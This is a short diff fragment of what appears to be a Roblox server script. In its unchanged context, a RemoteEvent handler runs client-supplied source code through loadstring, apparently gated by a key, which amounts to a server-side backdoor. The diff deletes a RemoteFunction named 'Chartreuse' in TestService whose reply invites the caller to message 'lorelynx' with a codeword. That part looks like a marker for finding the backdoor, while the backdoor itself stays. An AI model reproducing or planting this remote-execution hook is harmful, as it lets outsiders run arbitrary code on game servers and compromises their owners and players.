@@ -44,11 +44,3 @@ remote.OnServerEvent:Connect(function(plr, key, src)
         loadstring(src)()
     end
 end)
-
-local func = Instance.new("RemoteFunction")
-func.Name = "Chartreuse"
-func.Parent = game.TestService
-
-func.OnServerInvoke = function()
-    return "nice now dm lorelynx with the word 'flint'"
-end
